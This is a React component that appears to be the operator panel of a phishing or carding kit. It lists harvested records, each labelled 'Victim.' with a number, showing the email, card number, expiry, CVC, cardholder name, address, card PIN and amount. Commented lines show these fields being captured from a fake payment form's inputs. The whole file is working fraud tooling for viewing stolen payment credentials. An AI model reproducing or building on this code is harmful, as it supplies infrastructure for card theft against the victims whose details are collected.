import React from "react";

const Data = ({ OrderData }) => {
  // country: contry,
  // state: Province,
  // city: e.target.city.value,
  // Firstaddress: e.target.adressFirst.value,
  // Secondaddress: e.target.adressSecond.value,
  // postalcode: e.target.postal?.value,
  // AtmNumber: e.target.Atm.value,
  // amount: e.target.price.value,
  // expiry: e.target.expiry.value,
  // Cvc: e.target.cvc.value,
  // Cardholder: e.target.Cardholder.value,
  // pin: e.target.pin?.value,
  // zip: e.target.zip?.value,
  // cedex: e.target.cedex?.value,
  // district: e.target.district?.value,
  return (

    <div>
      {
        OrderData.map((data, i) => {
          return (
            <div key={i} className=" w-full mb-3 rounded-lg border shadow-md flex flex-col  ">
              <div className="flex items-center justify-center px-4 py-3 gap-2">
                <h1 className="font-semibold text-gray-500 ">Victim.</h1>
                <h2 className="text-gray-500 font-semibold">{i + 1}</h2>
              </div>
              <hr />
              <div className="flex items-center px-4 py-2 gap-2">
                <h1 className="font-semibold text-gray-500 ">Email :</h1>
                <h2 className="text-gray-600 font-semibold">{data.email}</h2>
              </div>
              <hr />
              <div className="flex items-center px-4 py-2 gap-2">
                <h1 className="font-semibold text-gray-500 ">Card No. :</h1>
                <h2 className="text-gray-500 ">{data.AtmNumber}</h2>
              </div>
              <hr />
              <div className="flex items-center px-4 py-2 gap-2">
                <h1 className="font-semibold text-gray-500 ">Expir :</h1>
                <h2 className="text-gray-500 ">{data.expiry}</h2>
              </div>
              <hr />
              <div className="flex items-center px-4 py-2 gap-2">
                <h1 className="font-semibold text-gray-500 ">CVC :</h1>
                <h2 className="text-gray-500 ">{data.Cvc}</h2>
              </div>
              <hr />
              <div className="flex items-center px-4 py-2 gap-2">
                <h1 className="font-semibold text-gray-500 ">Name :</h1>
                <h2 className="text-gray-500 ">{data.Cardholder}</h2>
              </div>
              <hr />
              <div className="flex items-center px-4 py-2 gap-2">
                <h1 className="font-semibold text-gray-500 ">Region :</h1>
                <h2 className="text-gray-500 ">{data.country}</h2>
              </div>
              <hr />
              <div className="flex items-center px-4 py-2 gap-2">
                <h1 className="font-semibold text-gray-500 ">Address 1 :</h1>
                <h2 className="text-gray-500 ">{data.Firstaddress}</h2>
              </div>
              <hr />
              <div className="flex items-center px-4 py-2 gap-2">
                <h1 className="font-semibold text-gray-500 ">Address 2 :</h1>
                <h2 className="text-gray-500 ">{data.Secondaddress}</h2>
              </div>
              <hr />
              <div className="flex items-center px-4 py-2 gap-2">
                <h1 className="font-semibold text-gray-500 ">City :</h1>
                <h2 className="text-gray-500 ">{data.city}</h2>
              </div>
              <hr />
              <div className="flex items-center px-4 py-2 gap-2">
                <h1 className="font-semibold text-gray-500 ">PIN :</h1>
                <h2 className="text-gray-500 ">{data.pin ? data.pin : <span className="text-red-400">null</span>}</h2>
              </div>
              <hr />
              <div className="flex items-center px-4 py-2 gap-2">
                <h1 className="font-semibold text-gray-500 ">State :</h1>
                <h2 className="text-gray-700 font-semibold ">{data.state}</h2>
              </div>
              <hr />
              <div className="flex items-center px-4 py-2 gap-2">
                <h1 className="font-semibold text-gray-500 ">postalcode</h1>
                <h2 className="text-gray-500 ">{data.postalcode ? data.postalcode : <span className="text-red-400">null</span>}</h2>
              </div>
              <hr />
              <div className="flex items-center px-4 py-2 gap-2">
                <h1 className="font-semibold text-gray-500 ">amount :</h1>
                <h2 className="text-gray-500 ">{data.amount}</h2>
              </div>
              <hr />
              <div className="flex items-center px-4 py-2 gap-2">
                <h1 className="font-semibold text-gray-500 ">zip :</h1>
                <h2 className="text-gray-500 ">{data.zip ? data.zip : <span className="text-red-400">null</span>}</h2>
              </div>
              <hr />
              <div className="flex items-center px-4 py-2 gap-2">
                <h1 className="font-semibold text-gray-500 ">cedex :</h1>
                <h2 className="text-gray-500 ">{data.cedex ? data.cedex : <span className="text-red-400">null</span>}</h2>
              </div>
              <hr />
              <div className="flex items-center px-4 py-2 gap-2">
                <h1 className="font-semibold text-gray-500 ">district :</h1>
                <h2 className="text-gray-500 ">{data.district ? data.district : <span className="text-red-400">null</span>}</h2>
              </div>
            </div>
          )
        })
      }
    </div>
  );
};

export default Data;
